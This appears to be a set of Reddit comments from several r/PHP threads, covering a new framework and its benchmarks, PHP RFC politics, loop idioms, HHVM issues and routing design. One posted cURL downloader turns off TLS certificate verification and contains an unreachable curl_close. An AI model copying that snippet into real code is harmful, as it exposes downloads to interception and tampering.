That's... a unique way of looking at it. If it's all just O(n) why don't we run the PHP standard library from javascript on webkit?
I WONT LEAVE YOU!
Right. If it were just get and set, maybe it would've passed.
Because no one's built it yet? :) But on a serious note, it would actually probably be faster, purely due to the JIT. But that's unimportant--big O notation is about describing *relative* speeds, and you're not going to get faster than O(n). The actual number of cpu operations is an implementation detail; one that can (and is in the process of) being remedied, and will likely be further remedied in the future, if/when the PHP core team gets around to implementing a JIT.
One time I was interested in something related to that, and met a guy that was writing a language that compiled to php: https://github.com/runekaagaard/snowscript
Sure, 1. [Routes](https://github.com/spiffyjr/spiffy-application/blob/develop/package/application/config/routes.php) are commented [here](https://github.com/spiffyjr/spiffy-application/blob/develop/package/application/config/routes.php). As for details on how you write the routes you can see them [here](https://github.com/spiffyjr/spiffy-route#adding-routes). 2. I do away with the concept of controllers composing multiple actions. Instead, SpiffyFramework uses actions (single-purpose controllers). A sample can be found [here](https://github.com/spiffyjr/spiffy-application/blob/develop/package/application/src/Home/IndexAction.php) along with a more detailed description in the comments. 3. I don't reinvent the wheel where it doesn't make sense. There are fantastic tools available for the http layer, console, logging, ORM, etc. With that, let me expand on #3. SpiffyFramework doesn't try and reinvent the wheel for every component. There are high-quality battle-hardened third party libraries available for functionality such as the http layer, console/cli, dbal/orm/odm, logging, etc. which I reuse as much as possible. * View: Twig by default however completely customizable. * CLI: I use Symfony's Console component for CLI. Any command that's inside the package's Console directory will be automatically added by default. This default behavior can, of course, be changed. * DBAL/ORM: I have two packages available that are currently in development. [spiffy-dbal-package](http://github.com/spiffyjr/spiffy-dbal-package) and [spiffy-doctrine-orm-package](https://github.com/spiffyjr/spiffy-doctrine-orm-package). I'm the original author of ZF2's [DoctrineModule](https://github.com/doctrine/doctrinemodule), [DoctrineORMModule](https://github.com/doctrine/doctrineormmodule), and [DoctrineMongoODMModule](https://github.com/doctrine/doctrinemongoodmmodule) so I have some experience in creating Doctrine bridge's. * Authentication module (I call them packages). No, not yet, but it's high on my todo list. I'll probably look for a high-quality authentication library and build out the service, actions, and views to support it. **EDIT** I'm going to update my original post with a tiny bit more info as well.
Thanks for explaining. What do you mean by &gt; If you add methods to __invoke() that don't exist in the route you will get an exception. How can you add a method to a method? What do you mean "exist in the route"? What CLI tool would you recommend? I'm talking about something similar to Laravel's Artisan, Cake's Bake, Django's manage, RoR's rake, etc.
Thanks!
I caught that typo and modified it to properly read: &gt; If you add parameters to __invoke() that don't exist in the route you will get an exception. Existing in the route means if you define a parameter in __invoke() and your route does not have that token available or the token does not have a default you will get an exception. e.g., Assuming the following route definition: &gt; 'home' =&gt; ['/', 'Application\Home\IndexAction'] Then having an __invoke method like: &gt; public function __invoke($id) will throw an exception because $id is not available. However, if your parameter was $id = null then that's perfectly fine because it's an optional parameter. You can use any CLI tool you wish but SpiffyFramework by default ships with support for Symfony Console. It's a very quality product used in numerous PHP projects (composer, doctrine, etc) so I didn't feel the need to look much further.
I'll give an example from my project. A couple routes: 'tanks' =&gt; ['/tanks', 'Application\Tank\IndexAction'], 'tanks/details' =&gt; ['/tanks/{slug:[\w-]+}', 'Application\Tank\DetailsAction'], They could reference the actions directly, but its usually more useful to references services instead (the skeleton doesn't include examples of that, though). 'Application\Tank\TreeAction' =&gt; ['Application\Tank\TreeAction', ['@tank-service']], 'Application\Tank\TreeDetailsAction' =&gt; ['Application\Tank\TreeDetailsAction', ['@tank-service']], Using services is better much of the time because of the dependency injection it lets you do. That's what the second entry in each service definition is - a list of dependencies to inject when constructing the class. Now the action: class IndexAction extends AbstractAction { /** @var TankService $service */ private $service; /** * @param TankService $service */ public function __construct($service) { $this-&gt;service = $service; } public function __invoke() { return [ 'tanks' =&gt; $this-&gt;service-&gt;getTanks(), ]; } } There's no standalone user/auth module, but it wouldn't be hard to make a package for it (packages are pretty much the same concept as modules in ZF2). There is a CLI tool, and is currently used for Doctrine and Assetic packages - so yes, there's also a Doctrine ORM package.
So which other frameworks have you speed tested it against and why is it faster than Laravel? 
That makes much more sense. Thanks. Didn't know about Symfony Console. I need a custom one for my work; that looks like exactly what I wanted to build off. Thanks!
I voted no. I done that because the patch was extremely complicated, not because I didn't want the core feature it was trying to promote. It might feel like a crappy excuse ...Consider that there are many many people charging themselves with the responsability to maintain any idea that is merged, consider that at least some of those people would be able to implement the core idea in a less compex fashion, as a result more of those people maintaining PHP will be able to debug, develop and maintain the idea. It makes sense to chase after the simplest possible soltions, to maximize our ability to maintain, to a decent standard, anything that is merged. I like the idea, I've spoken with the guy who wrote it, I wish he would revive his efforts and revise the patch and start pushing for the next major release. I would vote differently if the patch were the simplest it can be, I think most people would. Writing a patch takes an hour or two, defending your ideas is exhausting and brutal, it takes so much engergy that Clint was, understandably, put off. Someone else could champion the idea, I really feel however, it's his baby, he should do it; I'll help him, no doubt Nikita and Anthony will too ... if you're listening Clint, find us ;)
It takes __call() and like 10 lines of code to do what the RFC wants to do internally. I really don't see the need to implement this natively. __call() is your friend, listen to your friend.
Eh? I don't want it to be complex, but the *entire concept* was thrown out.
Thats useful. Thank you.
YII sounds terrible for any serious project in my opinion. Perhaps it will work as a very simple crud app but soon as you want to make something scalable, based on your opinion it sounds like a failure in design. The lack of routing sounds incredibly short sighted. How do you managed filters or routing callbacks prior to controller executions? How are you suppose to create promotional URLs or non-Latin character set URLs? I use laravel at my workplace, now I'm not the biggest fan of the framework but due to it's component aspects, it's incredibly easy to override and remove the rubbish parts. Also, programming isn't about business, it's about writing solid software so businesses won't fail when the time comes to making changes to a mature infrastructure. Also, from my experience the simpler something is, it means there has been trade offs.
Did you read the article? The article says something totally different
It depends on the circumstances. In different situations any of the loop functions may be appropriate.
for while foreach and all the language structures exist to use them. There is nothing bad into solving your problem with a "while"
&gt; it just seems like the core PHP team is either too small or too slow sometimes Perhaps ... how else *could* it be ... mountains that are formed slowly, are extremely strong stable structures, most of the time. I'd rather we changed slowly, I'd rather we took care in our decisions, than the alternative ;) The RFC process is kind of misunderstood. Us voting no, is as much a positive outcome as us voting yes; when we are writing a patch, when we are defending our ideas, we are nothing more than conducting research. Whatever the outcome of a vote, the research has been done, we know either every detail, or enough detail about the feature that our research can continue or has completed. There's nothing bad about conducting thorough research, research that tries to include as much data as possible in the shape of votes from internal's members. Let us have realistic expectations; I personally do not expect a refactoring of the standard library of the kind that would break compatibility with nearly all code. I'm expecting other solutions to come along, that do not break the majority of the sites of the internet. Nikita's scalar methods patch probably presents the best opportunity for PHP to solve these problems, since a new api is not shaped by bc, those methods can be consistent. More contributors is always good ... however, the vast majority of the work to be done is not introducing new features, it's obviously maintainence of those merged. This is a gargantuan and infinite task, and is obviously daunting to anyone without strong C fu, a lot of knowledge about Zend, and a lot of patience. I am absolutely sure that there are people out there with as much knowledge as me about Zend and as strong C fu, I'm sure that there are people sitting at their desks this morning, working on extensions and patches that none of us know about. *I* was such a programmer for a long long time. What I would really like is for those project managers that know they have such a person locked in a room where nobody can see them or ask them questions, to let them out of their prison for the mind, for the sake of everyone.
Because it was all one patch. If it were separate specific use-case patches (ofc some would be dependent upon a base rfc) then the primary get/set could be merged and the rest left for discussion. It is hard to discuss specific points of a huge patch/rfc and then to cut out the good parts to keep?
Use whatever is easier to read.
We're running 4 of our customers sites using it. We're seeing memory leaks and need to recycle hhvm as memory usage increases. The only other issue we've had is with a soap call that was failing with an error in hhvm but reverting back to php-fpm it was fine.
&gt; Syntax highlighting is desperately necessary since this is very docblock-heavy demonstration code. &gt; I don't understand why Medium is so popular for programming blogs. It's a pain to even get a code block and there is zero syntax highlighting. It's seriously one of the worst blog platforms for coding blogs. Great for long pieces of text, but horrible for syntax heavy code.
Totally understand *your* perspective. But following the internals I regularly see comments like this: &gt;If you want a formal programming language then just use one? &gt;-Lester Caine I mean... I don't really know what to think about that sort of thing being *regularly* bandied about in the internals mailing list. That's exactly the reason that everyone has been so excited about HHVM and Hack... they don't give devs an underlying feeling that we're being treated like whining children. The work of a core contributor is definitely not glamorous, and involves a ton of maintenance, merging and not much feature adding. I obviously understand and agree with this... and respect it. I also think it's fantastic that you and many of the contributors want your RFC's to be precise and your research to be thorough. That's to be applauded, not criticized. I'll also note that this thread was initially posted as a legitimate question, not a subtle way of criticizing the internals team. But my point about the internals team being too small is not about the volume or work being done, it's about the culture. That's changing, yes, but too many of the voting parties in the internals team in my opinion don't actually understand what it is that the PHP community values. People hacking Wordpress? They aren't **part** of the PHP community. They will google search stackoverflow and figure out how to do their hack no matter how strange it may seem to them, or hire a freelancer to do it for them, but either way it won't be much problem for them. The views like that in the quote from Lester at the beginning of this comment are what I mean by the team is "too small". It's too small for those sorts of opinions to carry weight. The internals team needs more people not because there's so much to do (although that's also probably true) but because it needs more perspective IMO. And that's something that's *entirely* separate from the RFC I linked to originally, we just kind of got on that tangent. As for the standard library... just give me an object wrapper for the scalar library functions, __to*() for all scalars in user objects, and I'll be one happy dev. :) 
Is there and RFC for RFC's in the internals team?
Obviously **foreach** only works with arrays (or objects that act like arrays). A **while** loop will take any condition that you give it, and does not have to involve arrays.
If you're iterating over an array, the `foreach` loop is considered idiomatic. Unless you are doing something weird (like having a non-sequential iteration order) you should prefer it.
&gt; I mean... I don't really know what to think about that sort of thing being regularly bandied about in the internals mailing list The problem with a mailing list is that whoever is speaking is listened too. Unlike reddit, or any other community driven communication system, internals members reading responses have no way of saying "shut up", or "this is not worth listening too". You can bet your bottom dollar our screns are being shouted at as much as yours. &gt; I'll also note that this thread was initially posted as a legitimate question, not a subtle way of criticizing the internals team. Understood, I provided a perspective because it seems relevant, and explanatory. &gt; That's exactly the reason that everyone has been so excited about HHVM and Hack... they don't give devs an underlying feeling that we're being treated like whining children. &gt; The internals team needs more people not because there's so much to do (although that's also probably true) but because it needs more perspective IMO. Humans are adept at holding in their head contradictory opinions, we do it all the time. I have to assume this is what you are doing here ... I'll try to explain what leads me to make that assertion ... PHP is developed in the open, to become a voting member you only need get involved, you do not need to know C, you can be a docuemntation maintainer, accumulate the kind of knowledge you need to make informed decisions, and so vote responsibly without writing a line of C. Hack is developed in a kind black box, you have absolutely no say what happens whatever, while it's true they accept open contributions and have open sources, this does not make it the kind of open source project I know works, the kind that I'm willing to commit time and effort too. I must conclude that if the lack of internals members effects negativey our perspective, then the HHVM team are in no better position, at all. I'm not really up for the HHVM vs PHP debate; I value above all the stablity and endurance of PHP as it's being developed now. I know that it works, I can disagree with some of the decisions made and I can defend the opinions that lead me to disagree, but I value the process that got us there and the people making responsible votes, whichever way they vote. I have to note ... These teams with no voices aren't putting in enough effort (of the kind that we all benefit from) to deserve a voice, that has to be true. Those teams should not be standing at the sidelines throwing stones, they should be getting their hands dirty and earning that voice. I'm wary of saying anyone is not putting in enough effort, but clarified what I meant, and will further justify it by saying that those people voting *should be responsible*, they should have an understanding of PHP from an internals perspective, and while they might be great framework authors or whatever, to be responsible you should have the kind of knowledge that comes from at least maintaining documentation if not writing code for Zend. You have to cast your vote on behalf of yourself or your community, *and* on behalf of the internals group responsible for the outcome. I'm sure it's more effort to rebel against decisions one has no control over, than it is to get involved. If someone cares enough to rebel, then that person should get involved, expend less energy, and have a chance of making a difference ;)
It's called Predawn
&gt; I nearly always use the "foreach" function To be strict, foreach and while are not functions.
0/10 advertising
An RFC for an RFC is either purposefully sarcastic (in which case not funny) or shows that you have no clue how an RFC process works. RFC's should start as small an concise as possible, then grow over time as seen fit for more to be added. For example, isset and unset in this proposal should have been trashed. Keep it simple with just get/set to start. Then if the use comes up to add those later it could be done either in this RFC or in another. This RFC smells of being over-thought to try and find as many niche edge-cases and squeeze them out up front compared to focusing on the task at hand.
You can host a Ghost (or WordPress) based blog for about 5 bucks a month on Digital Ocean. One click and 60 seconds later and you're done.
You can [Git subtree splits](https://help.github.com/articles/splitting-a-subpath-out-into-a-new-repository) to split a directory into multiple components. That's what Symfony does.
Always use FOREACH when iterating over a whole array, or at least from the top of an array to a BREAK condition. This way you will never be bitten by an "off by one" error. Always use FOR when you know (or can easily determine) exactly how many times you need to execute the code in the loop. This is also useful for iterating parts of an array where you aren't always going to be starting from the head. Use a DO-WHILE when the number of times to have to execute the loop is indeterminate, but you know the code must execute at least once. Use a WHILE loop when the looping condition could be false as you enter the loop. In other words, there could be conditions where you never execute the loop. 
Diagrams, pictures! So lacking in so many other projects. It's great to see a visual overview.
I haven't tested it against other frameworks. I might try testing the base app of a few, though.
&gt; I'm talking about something similar to Laravel's Artisan, I downloaded Laravel today to play with it. Their "artisan" is just a wrapper for Symfony's CLI tool.
I'm honestly stunned by the response here and I'm going to put out my hands for the downvote nails, becoming a martyr to the cause. **If you use while to loop over an array there's a 95%+ chance you're doing something retarded.** There are edge cases and extreme usage, but in general you're better off using the idiomatic and correct language construct here, just as in any other case. Foreach is for looping over arrays. That's what it does. It's clear, concise and correct. It's more readable by other users, and has no unpredictable side effects. Yes, you can use a shoe to hammer in nails but... seriously, just use a hammer. Just... please. Why are we giving any other answer? 
The way we (colleagues and I) have done something like this is by having each "module" in it's own namespace, and each it's own repository: /Namespace/Subnamespace Something like /Package/Core /Package/Rest /Package/Ui etc... Each of the repositories has the /src/ (and /tests/) folder in it's root, with a composer.json in said root, some packages depend on others, in this example, Core is always required. We then have for each project (client) another repository with one or more packages as dependency next to 3rd party packages we'd use for a project. The result would be Vendor + Package + Core + src + Rest + src + Ui + src Composer then creates the correct PSR-4 autoloader files. return array( 'Package\\Core\\' =&gt; array($vendorDir . '/Package/Core/src'), 'Package\\Rest\\' =&gt; array($vendorDir . '/Package/Rest/src'), 'Package\\Ui\\' =&gt; array($vendorDir . '/Package/Ui/src'), ); 
Despite my hatred of benchmarks I went ahead and tested Laravel, SpiffyFramework, and ZF2. Laravel comes out of the box tuned for performance and I tuned SpiffyFramework/ZF2 for what I would use in production. All benchmarks were done using ab -n 10 -c 10 twice and apache was restarted each run as well. The first run was discarded and considered a warmup period. The machine was a 4 core 2 GB VMware instance running Ubuntu 14.04, PHP 5.5, and Apache2. All frameworks were tested using composer's optimized autoloader. * Laravel: 1,919 completed requests @ 185.54 req / sec * ZF2: 2,100 completed requestes @ 209.97 req / sec * SpiffyFramework: 8,292 completed requests @ 828.98 req / sec * Symfony (Hello World): 9,245 completed requests @ 924.35 req / sec Those results are so crazy I thought I did something wrong but after double-checking I'm confident those are the results are accurate. If someone wants to double-check my work I'd appreciate it. **EDIT** I added Symfony's "Hello World" results.
Oh, I also implemented [BrainFuck](https://github.com/ircmaxell/PHP-BrainFuck) as a parsed VM based language (different from many, as I'm not interpreting it as it parses, there's a separate parse and execute phase). 
Sigh. 1. Laravel doesn't come tuned for performance out of the box. 2. The results are misleading because the respective frameworks are offering more out of the box (sessions, cookie MAC signing + encryption, etc.) compared to what you are providing. It's like making a blank PHP "Hello world" script and saying "see, it's faster than Symfony!". It's totally meaningless. Otherwise, congratulations on releasing some code.
&gt; I do away with the concept of controllers composing multiple actions. Instead, SpiffyFramework uses actions (single-purpose controllers). Nice to see another example of at least the "Action" portion of [Action-Domain-Responder](https://github.com/pmjones/mvc-refinement) in the wild.
&gt; This RFC smells of being over-thought to try and find as many niche edge-cases and squeeze them out up front compared to focusing on the task at hand. Isn't that considered something that is good and something that PHP doesn't have enough of?
&gt; Nice to se I had been tinkering with single action controllers for some time. Once I read your blog post I decided to go a step further and actually implement the idea fully. Your blog was the driving factor for the way actions are in SpiffyFramework.
That's exactly what I do. We use Laravel as a base framework, then build each 'app' as a composer package that sits in its own composer package, set with routes, controllers, models, views etc. When we want to increment the version of a composer package, just update composer.json in the base Laravel package to the new version. 
Sweet! Others like Stephan Hochdorfer have been doing single-action controllers for a while too. I'm interested to hear how it has been working out for you. Also, are you doing the "Responder" portion as well?
&gt; Is it bad practice to use foreach instead of while? No. :-)
&lt;http://www.phptherightway.com&gt; is always a good place to start.
Cheers mate!
"Heh" indeed. :-)
I see what you did there.
Yep, and 95% of the time I see a while loop it's coded wrong. And 95% of the time that a weird combination of inputs causes Apache to hang .... yep, you guessed it a fucking while loop with a strange exit clause is never exiting. If you really really have to use one, please add a 'fuse' i.e. if ($fuse++ &gt; 1000000) break; so at least when you fuck up some happens eventually.
+1 for phptherightway.com too, though I'm curious, what would you consider goes into a "good beginners guide." Setting up PHP environments? Learning to program? PHP gotchas? etc...
I'd assume doing this internally would be faster than using __call()
This is how we develop with app being used exclusively to contain application specific customization of our packages and configuration. For example we have an administration package used by several applications, one may extend certain controllers or repositories with methods only required by that application so they stay within the app file and extend the package. We make heavy use of the IoC and tend to use config files to tell our service providers which model to load for each repository like so: $this-&gt;app-&gt;bindShared(array('Company\PackageName\Models\Glossary\Eloquent\GlossaryRepository' =&gt; 'training.glossary'), function(Application $app) { $model = $app['config']['training::models.glossary']; return new GlossaryRepository($model); }); In the above example we can overload the Model used by the GlossaryRepository class with one found within the app directory structure, so long as the new one implements the same interface it all works :)
Don't assume what you don't know.
I took Jeffrey Way's [TutsPlus course](http://courses.tutsplus.com/courses/php-fundamentals) a while ago and I thought it did a pretty good job of going over the most of the basics you'd need to know. Looks like the course is $25 now but I think it's worth it for the amount of material you get. For a similar but free option, you could try [PHP Academy's Learn PHP series](https://www.youtube.com/playlist?list=PLfdtiltiRHWFD41D_LDomY1Fb-O9MtFqq) on YouTube. You might get pointed to CodeAcademy's course at some point but, while I appreciate the work they've put in, I feel like that particular course was extremely lacking. No one course, site, or tutorial is going to be able to cover every aspect and every perspective on PHP so just keep that in mind. After you've gone through the basics, just start building out small projects and increase the difficulty one after another. As usual, refer to the docs, Stackoverflow, and Google when you're feeling stuck. Hope that helps and best of luck to you. 
Wrt the header function I would probably just use the header() function. It spiritually mirrors your using of super globals to get some of the input so it should be reasonably kosher for your library and people can choose not to use it. The main point is that I'm not sure how the token is encoded so should not have to worry about escaping it. You could also look at oauth 1.x libraries since they usually have to read/write to headers and making the api user handle that is especially not practical with oauth 1.x. Wrt the hash comparison I came upon this article a while back which you may find interesting: https://www.isecpartners.com/blog/2011/february/double-hmac-verification.aspx. The reasoning about compiler optimization may become more important with hhvm and phpng. I'm not a security expert, but this justification to use an easier solution is good enough for me ;)
It can certainly use more thought out thinking up front. But the first RFC should be "Here is the new syntax, with get, set, and the &amp; operator so other things can work right with this change." From there you should make an RFC for unset/isset which depend upon this RFC passing. Then it has ReflectionProperty changes. Do those need to be in the primary pull or could those be their own RFC to discuss just the merits of that addition? Also imo the whole, set either needing ($value) specified or leaving it off to default $value in is pretty lame. Just say set($value) is needed. That would keep things simpler and more maintainable. See where this is going? This RFC is a big addition, but it doesn't require one huge RFC to pass it all through. 
Ever given any thought to having the core application class implement the Symfony HttpKernelInterface? That way people could take advantage of [Stack](http://stackphp.com/) middlewares. Might be especially useful in Spiffy's case with its "only add what you need" mentality.
&gt; The only other issue we've had is with a soap call that was failing with an error in hhvm We had the same problem. We ended up writing a "hack" that would call the php-cli and make the soap call from there. The cli would then return the results. It's not the greatest. But it works.
So you want to save the image? I wrote the bellow on my massive booru downloader, it's edited to work outside of the rest of the script. $imgtosave = ""; $fileoutput = ""; function curlit($dd) { $ch = curl_init($dd); //curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: derpibooru.org')); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Fluttershy is best pony)'); curl_setopt($ch, CURLOPT_TIMEOUT, 400); $raw=curl_exec($ch); return $raw; curl_close ($ch); } $fp = fopen($fileoutput,'x'); fwrite($fp, curlit($imgtosave)); fclose($fp);
&gt; something hard Benchmarks still have a purpose as long as your specifically targeting a component for improvement. e.g., benchmarking a heavily used component (events, IoC container, etc) along with your regular unit tests to ensure performance doesn't degrade. There are [tools](https://github.com/polyfractal/athletic) for that already and I most encourage using them.
Hrm, I could probably do that. Thanks for the tip.
There's a lot of work involved in this. For basics: **1. PHP** - Handling POST data - Redirects - Connecting to a database, querying, and reading from it using PDO - PDO SQL injection prevention - General PHP syntax like loops and control structures - Authentication, password hashing &amp; storage, password recovery, &amp; sessions (unless you want 100% anonymous comments) - Filtering and sanitizing input from forms before storing it in the database - Escaping output retrieved from the database before displaying it to the user **2. MySQL** - Creating a database - Creating database tables - Select, insert, update queries (and how to do this in PHP's PDO) The advanced stuff is knowing how to properly separate all of your code so that it's reusable and maintainable, and while it's good practice to do this, it's not technically necessary to get your comment system working.
&gt; Benchmarks are only useful for saying "This is the fastest X framework/application will ever perform." Preach the Word, my brother.
Interesting piece, Paul. I think I have to agree. The best place to handle this from a separation of concerns view is the router. My only real gripe with that is that the controllers themselves are now not portable. They are tied to that particular router. This is the typical argument for putting it in the action/controller instead. There's no way to really tackle this issue without making a tradeoff somewhere. I think the router compromise is the least damaging tradeoff, you just have to be aware of what you're giving up if you go that route. Also, AFAIK, Aura has the only router that does this in PHP.
Most of the time, this is the correct approach. Unless something's changed recently, though, foreach actually copies the array you give it and iterates over that copy, not the original. This can cause problems if you're trying to modify an array within the loop (serious corner case) or if your array is really big, like a huge dataset from SQL. This quirk shouldn't affect most day-to-day usage, so it's just something to keep in mind.
I agree conceptually, for all the reasons listed, but you could benefit from some practical examples of how a stream-as-a-body would work with, say, templated views, or JSON API responses. Right now, it's only blatantly obvious for static content or existing PHP streams. It would be pretty weird to have to use stream wrapper boilerplate around `json_encode()`, for example.
Thanks!
So if I typically respond with a default presentation (if everything else is correct). For example in an API call, we can request JSON or XML. Here if the requester passes in a bad parameter for a format type it falls back to JSON and lets the requester deal with it. I've implemented this in the controller in the past. Also, I'm curious to see what format a negotiation should look like if there is a filter - again using say an API call - I can send a JSON object with what I'm want, place params in the GET request, send XML, or even use the HTTP header. I'm a bit biased and would go the RESTful way of GET params (due to their fast accessibility). The method I found works easiest for me to develop with and that I've been using is separating a controller from a resource (at least for API type calls) and let the resource determine what format to output. So a controller can have a resource, but the resource doesn't need a controller.
I think it largely depends on how you define "community", which is possibly too broad a term to nail down with any real accuracy. Honestly I'm not sure anyone should even care how its defined on an individual basis. It seems more like nitpicking than anything which will lead to useful change. If PHP discussion is all that is required to be part of the PHP community then everyone who posts something in this reddit (or any other public forum) must also be a part of the PHP community. If writing for PHP core or participating in core-level discussion is a requirement to be part of the PHP community, then almost nobody is a part of it. Then you've got all the definitions which might fall in between the two extremes. &gt;if you want a real programming language, then go use one. I don't think this is what people are trying to say, though it may come off sounding like that because PHP gets constantly attacked by people for both legitimate and illegitimate reasons and I could see having to constantly explain things as tiring. What they are probably trying to say is usually something more like: - if you don't like PHP, you might be happier with a different language or - Like most languages, PHP is not suited to every task. Use the right tool for the job. &gt;So why, then, is so much effort put into making the lives of this group easier? Their experience of the language will be mostly the same no matter how easy or hard others make it for them. I don't think the core team introduces things and spends effort on improvement to appease people who will never be anything more than rank novices. They make improvements because it's useful to them, or a significant number of professional users. The average person doesn't have any real say in the direction of the language. Lots of things have made it in to PHP that bad programmers will never understand or touch. However the main strength (and arguably it's greatest weakness) is that it is quite possibly the most approachable language in the world since BASIC and LOGO.
&gt;I don't think this is what people are trying to say Just a note, that was an actual quote from the internals mailing list, but it's not intended to be a representation of how the internals team feels about the PHP community. It was illustrative. 
It absolutely belongs in the router. That's the router's only job - inspect the current request context and pass control to the appropriate controller/action. Acceptable content types are no different than HTTP verbs or URIs in terms of being valid routing criteria.
Its likely better to use [array_* functions](http://php.net/manual/en/ref.array.php) in a lot of cases. If you're simply iterating over an array and transforming its data, reducing its data to a single value, etc, these functions make the process more comprehensible and limit scope. * array_reduce — Iteratively reduce the array to a single value using a callback function * array_map — Applies the callback to the elements of the given arrays
I actually saw some benchmarks that showed using `foreach()` was slower when you were making modifications within the array and `for()` was faster. Also, getting the count *before* starting the `for()` loop was faster than including it in the arguments. **EDIT** Source for `foreach()` v. `for()` comparison: http://www.phpbench.com
The general consensus is that controllers aren't meant to be portable. Disregarding that, though, there's no reason that handling content negotiation in the router implicitly makes your controllers non-portable. It just means all the other routers are broken. ;-)
The same question can be asked about quite literally *anything*. What constitutes the ___________ community? Fill in the blank with anything you can think of, and there is never a real, canonical answer. If I absolutely had to take a swag at it, I'd say a community is comprised of anyone who willingly considers themselves a member of it. That's about the best you can hope for, IMHO.
This is all very true, but in most cases this will not be the bottleneck in your process. In most cases, your arrays are not so huge that the speed differences will add up to a significant savings by breaking convention. Write your code for readability and error-avoidance first, optimize later when you know what is *actually* causing you to miss your SLA. When you break a 'convention' like using a FOREACH (for example) leave a comment in your code spelling out why. 
It really does depend on how you define community. The main definition is simply a group of people living in the same place or having something in common, and under that definition, any one who uses PHP would be a member of the php community. Usually, however, when people refer to communities in programming, they mean it in the communal sense of fellowship and contribution, either in the form of knowledge or product. If you are creating open source libraries for other community members to use, you are contributing. If you are helping others to learn more, you are contributing. A person who partakes of the communal goods but never gives back in kind is a tourist. A person on an island that doesn't partake of anything and has no communication is an alien.
You can use a reference in the foreach loop if you want to modify the array.
&gt; Yeah, but how? Most common test suites are for byte generators. Testing getBytes() does not provide any additional information, as it simply relies on the system random generators. As the library allows generating numbers in huge sets it is practically impossible to test every possible outcome, but one thing you could do to test the formula is just to test for smaller ranges. I.e. supply a fake random generator which allows you to feed all the possible byte sequences (00000000-11111111 and so on) to the getInteger method, and see that all the numbers in the given range gets returned equally. Somethig like this https://github.com/timoh6/GenPhrase/blob/master/tests/GenPhrase/Random/RandomTest.php#L25. &gt; There are some little things. For example the stream_set_chunk_size() that is required for the buffered reads requires 5.4.0. I also make use of (new object)-&gt;method() structure in tests. That makes sense.
Community is everybody who uses php, except the people I don't like.
I assert it doesn't even mean "all the other routers are broken." To summarize the article: the Router does a first-pass filter to make sure the ADR or MVC trio can present an acceptable response, and the actual negotiation work occurs in the presentation layer. If you leave out the first-pass filter, you still end up routing to an Action/Controller, which invokes the Domain/Model work. At Responder/View time, the negotiation occurs, but if negotiation fails, we discard all the Domain/Model work (a waste of resources) to return a 406 response. So it doesn't mean the other routers are broken, it just means that the rest of the app ends up doing work that it might not have otherwise needed to do. Hope that makes sense.
Thanks dude. FWIW, I don't think it ties ADR or MVC trios to a particular router; in theory, the Action/Controller should not know how it was invoked, so the router should not be entering into it. But I totally agree with you on tradeoffs -- you pick the pain you think you can live with.
Source? I can't believe it
&gt; let the resource determine what format to output That sounds like an RMR-ish approach: http://www.peej.co.uk/articles/rmr-architecture.html
&gt; would this loop be infinite As written, that loop is not infinite. The following, however, would be: function baz(&amp;$foo) { foreach ($foo as $bar) { array_push($foo, 1); } } $foo = [1, 2, 3]; baz($foo); And: $foo = [1, 2, 3]; foreach ($foo as &amp;$bar) { array_push($foo, 1); } /u/nikic has a [good blog post](http://nikic.github.io/2011/11/11/PHP-Internals-When-does-foreach-copy.html) on how `foreach` handles this type of stuff.
&gt;This can cause problems if you're trying to modify an array within the loop How would something like this be affected by that? foreach($dataset as $key =&gt; $val) { $dataset[$key] = foo($val, 'bar'); } Honest question.
Thanks dude! 
Language constructs can be functions, for all intents and purposes. Semantic pedantry isn't helpful to anyone.
This is just a long preface to a no true scotsman argument.
But this isn't an unimportant question either. Who the PHP community is affects what is reasonable for groups like PHP-FIG and PHP internals to do.
Okay, performance aside, WHY ARE YOU DOING THIS!? Is this a template or something? EDIT: Just noticed the get_template_part, so yeah it's a template... I don't think there's a performance penalty to be worried about with this, but it's certainly much more unreadable.
&gt; Wrt the hash comparison I came upon this article a while back which you may find interesting: https://www.isecpartners.com/blog/2011/february/double-hmac-verification.aspx. The reasoning about compiler optimization may become more important with hhvm and phpng. I'm not a security expert, but this justification to use an easier solution is good enough for me ;) You need to hash the values with a secret param (that's why the isecpartners.com article suggests HMAC). Raw, i.e. sha1 hashing won't help to hide the timing side-channel. It is actually better to use a random "secret param" every time with the double HMAC approach, since using the same HMAC key leaks information (although not practically exploitable).
It looks like it's WordPress to me, I wouldn't be surprised if they're just following some example from the codex.
This will modify the original array, setting the values of $dataset[$key] to whatever foo returns.
Seconding both /u/__constructor and /u/JordanLeDoux on this. While you're clearly using wordpress, you do not need to be breaking it up line by line. I don't think the codex even recommends this. Performance wise? No change, negligible if any. But you'll make your code harder to read, and you're adding complexity, so it has more places to break this way. &lt;?php while ( have_posts() ) : the_post(); get_template_part( 'content', 'page' ); endwhile; // end of the loop. ?&gt; Much simpler. Edit: Remove broken example
The design isn't horrible, but it does some things for no good reason. For example, why are you rendering partials outside of the template? $tower-&gt;partial-&gt;set('footer', 'footer.php'); makes no sense - the view should have access to the template engine scope. It should be more like: $this-&gt;partial('something.php'); (inside the template) and then just render inline. Another thing you should build support for is view helpers. These are user defined functions which can be included within a view's scope that assist with common formatting operations you might perform. Providing this extra level of separation can help to unclutter templates a little more and can DRY up code for views. 
They are insane. In a staging site i was running it on, dropped the category load time from 11 seconds to 3.5. These are smaller shops with less than 100k turnover monthly who wanted speedups without spending a lot if money.
I do a fair amount of wordpress development and ... this is just how it's typically done. It's an extremely common pattern and few wordpress devs would have any problem reading it.
&gt; It's an extremely common pattern and few wordpress devs would have any problem reading it. Because clearly THAT'S the issue with it. This is an awful way to do this, whether or not the army of scripters that make money maintaining WP sites is used to it.
A many-to-many RDB system.
Could you elaborate on that?
I thought [platesphp](http://platesphp.com/) already filled this role?
You use a many-to-many relationship in a database to match posts with tags post{ id, title, content } tag{ id, name } post_tag{ post_id, tag_id } Put the appropriate keys and constraints in.
Many to Many (sometimes refered to as Has Many Through) is just a way to set up database associations so that you can associate many records with many other records. This is generally achieved with three tables, where one of the tables serves as the associative link between records in the other two. For eample, if you have an article, and the article has many tags, you might set up a system where you have an article table, an association table, and a tag table. The association table would have records where each row would contain an article id, and a tag id. This way you can pull all tags associated with any given article, and each tag only has to be defined once, but can be used many times.
Yes, that's the point. What's the problem you're saying it would cause?
